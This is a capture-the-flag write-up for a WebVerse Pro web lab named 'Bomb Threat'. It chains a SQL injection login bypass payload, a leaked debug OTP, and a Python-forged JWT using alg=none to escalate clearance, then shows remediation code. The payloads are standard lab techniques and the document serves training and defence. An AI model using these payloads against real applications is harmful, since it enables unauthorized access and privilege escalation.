<!--
  Bomb Threat — WebVerse Pro Writeup
  A clean, GitHub-optimized guide. No flags, no direct spoilers.
  See BombThreat_Guide.html for the full creative debrief.
-->

<p align="center">
  <img src="https://img.shields.io/badge/Platform-WebVerse%20Pro-ff1a4a?style=for-the-badge" alt="Platform">
  <img src="https://img.shields.io/badge/Difficulty-Medium-ffbb00?style=for-the-badge" alt="Difficulty">
  <img src="https://img.shields.io/badge/Stack-Node.js%20%2B%20Express%20%2B%20SQLite-00eeff?style=for-the-badge" alt="Stack">
  <img src="https://img.shields.io/badge/Type-Web%20Application-00ff88?style=for-the-badge" alt="Type">
</p>

<p align="center">
  <b>SQL Injection → Debug OTP Leak → JWT `alg=none` Forgery → Privileged Deactivation</b>
</p>

---

## Table of Contents

- [Scenario](#-scenario)
- [Reconnaissance](#-reconnaissance)
  - [Port Scan](#port-scan)
  - [API Endpoint Map](#api-endpoint-map)
- [Exploit Chain](#-exploit-chain)
  - [Vulnerability ① — SQL Injection](#vulnerability--sql-injection-in-login)
  - [Vulnerability ② — Debug OTP Leak](#vulnerability--debug-field-otp-disclosure)
  - [Vulnerability ③ — JWT `alg=none`](#vulnerability--jwt-algnone-signature-bypass)
  - [Stage ④ — Deactivation](#stage--device-deactivation)
- [Attack Flow (Mermaid)](#-attack-flow-diagram)
- [Remediation](#-remediation)
- [Key Takeaways](#-key-takeaways)
- [MITRE ATT&CK](#-mitre-attck-mapping)
- [Skills Practiced](#-skills-practiced)
- [References](#-references)

---

## 🎯 Scenario

An anonymous group has armed a 15-kiloton device under Central London, controlled remotely through a single-page console: **NEXUS Control**. The portal enforces a three-stage authentication flow:

1. **Login** — operator ID + password
2. **MFA** — 6-digit one-time password sent via email
3. **Deactivation** — gated behind **Level 5 clearance** (our stolen account is Level 1)

We authenticate as `bgoldstein`, a **Maintenance** operator with only **Level 1** clearance. The objective: escalate to Level 5 and trigger the deactivation sequence.

> [!NOTE]
> **Target:** `10.100.173.14` (virtual host: `bombthreat.local`)<br>
> **Lab author:** [7s26simon](https://medium.com/@7s26simon)

---

## 🔍 Reconnaissance

### Port Scan

| Port | Service | Version | Notes |
|:-----|:--------|:--------|:------|
| `80/tcp` | nginx | 1.27.5 | Reverse proxy → Node.js Express backend |

The server issues a `301 Moved Permanently` redirect to `bombthreat.local`. Add this to `/etc/hosts` before interacting with the application:

```
10.100.173.14   bombthreat.local
```

### API Endpoint Map

| Method | Endpoint | Auth | Purpose |
|:-------|:---------|:-----|:--------|
| `POST` | `/api/auth/login` | — | Authenticate; triggers MFA flow |
| `POST` | `/api/auth/verify-mfa` | Session cookie | Verify OTP; issue JWT access token |
| `GET` | `/api/device` | Session + JWT | Fetch device telemetry |
| `POST` | `/api/bomb/deactivate` | Session + JWT (Level 5) | **Disarm the device** |
| `POST` | `/api/auth/logout` | Session | Terminate session |

---

## ⛓ Exploit Chain

Three independent vulnerabilities combine into a single privilege escalation:

```
SQL Injection (login bypass)
    → Debug Field OTP Leak (MFA bypass)
        → JWT alg=none Forgery (clearance escalation)
            → Privileged Deactivation
```

---

### Vulnerability ① — SQL Injection in Login

**Endpoint:** `POST /api/auth/login`  
**Severity:** <span style="color:#ff1a4a">█ Critical</span>  
**CWE:** [CWE-89](https://cwe.mitre.org/data/definitions/89.html)

The login handler concatenates user input directly into a SQLite query without parameterization. The application queries a users table and compares credentials inline — a textbook SQL injection sink.

> [!CAUTION]
> **Root cause:** User-supplied username is interpolated directly into a raw SQL string. No prepared statements. No input sanitization.

**Bypass payload:**

```http
POST /api/auth/login HTTP/1.1
Content-Type: application/json

{
  "username": "' OR 1=1 --",
  "password": "irrelevant"
}
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username = '' OR 1=1 --' AND password = '...'
```

`OR 1=1` forces the `WHERE` clause to always evaluate true, and `--` comments out the password check. The database returns the first user row — `bgoldstein`.

> [!IMPORTANT]
> The server responds `200 OK`, sets a session cookie (`connect.sid`), and returns an MFA challenge — but the response body also leaks a critical debug artifact.

---

### Vulnerability ② — Debug Field OTP Disclosure

**Endpoint:** `POST /api/auth/login` (response body)  
**Severity:** <span style="color:#ff1a4a">█ Critical</span>  
**CWE:** [CWE-215](https://cwe.mitre.org/data/definitions/215.html) / [CWE-489](https://cwe.mitre.org/data/definitions/489.html)

The login response ships a `_debug` object to the client:

```json
{
  "success": true,
  "message": "Credentials accepted. MFA required.",
  "user": {
    "id": "usr_bg_0042",
    "clearance": "LEVEL 1"
  },
  "mfa": {
    "method": "EMAIL_OTP",
    "expires_in": 300,
    "_debug": {
      "note": "TODO: remove before production",
      "otp_value": "••••••"
    }
  }
}
```

The `mfa._debug.otp_value` field contains the 6-digit one-time password in plaintext. The `"TODO: remove before production"` comment is remarkably honest.

> [!WARNING]
> This leak renders the MFA step completely ineffective. An attacker who bypasses login via SQLi can immediately read the OTP from the response and proceed to token issuance.

**MFA verification with the leaked OTP and session cookie:**

```http
POST /api/auth/verify-mfa HTTP/1.1
Cookie: connect.sid=<SESSION_COOKIE>
Content-Type: application/json

{
  "code": "••••••"
}
```

The server returns a signed JWT:

```json
{
  "success": true,
  "access_token": "eyJhbGciOiJIUzI1NiIs..."
}
```

Decoded:

```json
// Header
{"alg": "HS256", "typ": "JWT"}

// Payload
{"sub": "bgoldstein", "clearance": "level1", "iat": …}
```

We're authenticated with **Level 1** clearance. The dashboard confirms: deactivation requires **Level 5**. The JWT implementation is about to provide the escalation path.

---

### Vulnerability ③ — JWT `alg=none` Signature Bypass

**Endpoint:** All authenticated endpoints (JWT verification middleware)  
**Severity:** <span style="color:#ff1a4a">█ Critical</span>  
**CWE:** [CWE-347](https://cwe.mitre.org/data/definitions/347.html) — Improper Verification of Cryptographic Signature

The server uses a **custom JWT parser** that reads the `alg` header claim *before* verifying the signature. When the algorithm is `"none"`, the parser skips signature verification entirely and trusts whatever claims appear in the payload.

> [!CAUTION]
> This is the classic **JWT algorithm confusion attack** (publicly documented 2015). The `alg` header claim is attacker-controlled and must **never** be trusted before the signature is verified.

#### Token Forgery

**Step 1 — Forge the header:**
```json
{"alg":"none","typ":"JWT"}
```
→ Base64url: `eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0`

**Step 2 — Forge the payload (escalate clearance):**
```json
{"sub":"bgoldstein","clearance":"level5","iat":…}
```
→ Base64url: `eyJzdWIiOiJiZ29sZHN0ZWluIiwiY2xlYXJhbmNlIjoibGV2ZWw1IiwiaWF0Ij…`

**Step 3 — Empty signature (alg=none requires none):**
```
header.payload.
```

| Property | Original Token | Forged Token |
|:---------|:---------------|:-------------|
| Algorithm | HS256 (HMAC-SHA256) | **none** |
| Clearance | level1 | **level5** |
| Signature | Valid HMAC | Empty — accepted by custom parser |
| Deactivation | ✗ Rejected | ✓ Accepted |

<details>
<summary>📜 Python: Forge the token</summary>

```python
import base64, json

def b64url(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

header = json.dumps({"alg":"none","typ":"JWT"}, separators=(",",":"))
payload = json.dumps({
    "sub": "bgoldstein",
    "clearance": "level5",
    "iat": 1781452390
}, separators=(",",":"))

forged_token = f"{b64url(header.encode())}.{b64url(payload.encode())}."
print(forged_token)
```
</details>

---

### Stage ④ — Device Deactivation

**Endpoint:** `POST /api/bomb/deactivate`  
**Authorization:** `Bearer <forged_level5_token>`

```http
POST /api/bomb/deactivate HTTP/1.1
Cookie: connect.sid=<SESSION_COOKIE>
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJiZ29sZHN0ZWluIiwiY2xlYXJhbmNlIjoibGV2ZWw1IiwiaWF0Ij…
Content-Type: application/json
```

```json
{
  "success": true,
  "message": "LEVEL 5 clearance accepted. Device deactivated.",
  "flag": "FLAG{...}"
}
```

The server reads `clearance: level5` from the unsigned payload, grants access, and disarms the device.

> [!TIP]
> **Key insight:** The server never validates *who signed the token* — it only checks the `clearance` claim in the payload. Combined with `alg=none`, this means any attacker can mint arbitrary clearance tokens.

---

## 📊 Attack Flow Diagram

```mermaid
graph TD
    A[🔴 Unauthenticated] -->|"SQLi: ' OR 1=1 --"| B[🟡 Login Bypassed]
    B -->|"Read _debug.otp_value"| C[🟡 OTP Captured]
    C -->|"POST /verify-mfa"| D[🟢 Level 1 JWT]
    D -->|"Forge alg=none, clearance=level5"| E[🟢 Level 5 JWT]
    E -->|"POST /bomb/deactivate"| F[🏁 Deactivated]

    style A fill:#ff1a4a,color:#fff
    style B fill:#ffbb00,color:#000
    style C fill:#ffbb00,color:#000
    style D fill:#00ff88,color:#000
    style E fill:#00ff88,color:#000
    style F fill:#00eeff,color:#000
```

---

## 🛡 Remediation

### 1. SQL Injection → Parameterized Queries

```javascript
// ❌ Vulnerable — string interpolation
db.prepare(`SELECT * FROM users WHERE username = '${username}'`).get();

// ✅ Safe — prepared statement
db.prepare('SELECT * FROM users WHERE username = ?').get(username);
```

> [!IMPORTANT]
> Use parameterized queries **exclusively**. Never concatenate user input into SQL strings — even for dynamic table/column names (use an allowlist instead).

### 2. Debug Leak → Environment-Gated Logging

```javascript
const response = {
  success: true,
  mfa: { method: 'EMAIL_OTP', expires_in: 300 }
};

if (process.env.NODE_ENV !== 'production') {
  response.mfa._debug = { otp_value: generatedOtp };
}
```

> [!WARNING]
> The `_debug` object should **never** appear in production API responses. Use environment variables to gate debug output, and consider structured logging (e.g., `pino`, `winston`) with redaction for sensitive fields.

### 3. JWT → Well-Audited Library + Algorithm Allowlist

```javascript
const jwt = require('jsonwebtoken');

// ✅ Explicit algorithm allowlist — rejects alg=none by default
const payload = jwt.verify(token, SECRET_KEY, {
  algorithms: ['HS256']
});
```

> [!CAUTION]
> The `jsonwebtoken` library **rejects** `alg: none` tokens by default. Always specify an `algorithms` allowlist. Never trust the `alg` header claim before verification — it is attacker-controlled.

---

## 🧠 Key Takeaways

| # | Lesson |
|:--|:-------|
| **1** | **Multi-step auth is only as strong as its weakest link.** SQLi in step 1 rendered MFA in step 2 useless. |
| **2** | **Debug fields are gold for attackers.** The OTP was hiding in `_debug.otp_value` — most automated scanners would miss it. Read API responses carefully. |
| **3** | **`alg=none` is the oldest JWT trick in the book.** Custom JWT parsers that check the algorithm header *before* the signature are fundamentally broken. Always use a battle-tested library. |
| **4** | **Chain unrelated flaws.** SQLi → OTP leak → JWT forgery. No single vulnerability would have been sufficient, but chained together they formed a complete 0-to-deactivation escalation. |
| **5** | **Session management matters.** The MFA step required the session cookie from the login response — a subtle but critical detail that prevents naive replay attacks. |

---

## 🗡 MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|:-------|:----------|:---|
| Initial Access | Exploit Public-Facing Application (SQL Injection) | [T1190](https://attack.mitre.org/techniques/T1190/) |
| Credential Access | Multi-Factor Authentication Interception | [T1111](https://attack.mitre.org/techniques/T1111/) |
| Defense Evasion | Access Token Manipulation: Token Impersonation/Theft | [T1134.001](https://attack.mitre.org/techniques/T1134/001/) |
| Privilege Escalation | Access Token Manipulation | [T1134](https://attack.mitre.org/techniques/T1134/) |

---

## 🎓 Skills Practiced

- [x] SQL injection in login forms with concatenated queries
- [x] Spotting debug/development-only fields in API responses
- [x] JWT `alg=none` header confusion attack (CWE-347)
- [x] Forging JWT payload claims without a signing key
- [x] Chaining unrelated weaknesses across multi-step authentication flows
- [x] Session cookie management across a stateful exploit chain

---

## 📚 References

- [JWT alg=none Attack — Auth0 (2015)](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/)
- [CWE-347: Improper Verification of Cryptographic Signature](https://cwe.mitre.org/data/definitions/347.html)
- [OWASP: SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP: JWT Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html)
- [PayloadsAllTheThings — JWT Attacks](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
- [CWE-215: Insertion of Sensitive Information Into Debug Output](https://cwe.mitre.org/data/definitions/215.html)
- [MITRE ATT&CK — T1134: Access Token Manipulation](https://attack.mitre.org/techniques/T1134/)

---

<p align="center">
  <sub>Writeup by <b>BlackMagic Operator</b> · Lab by <a href="https://medium.com/@7s26simon">7s26simon</a> on WebVerse Pro</sub><br>
  <sub>No flags or direct spoilers — methodology and technique only</sub>
</p>
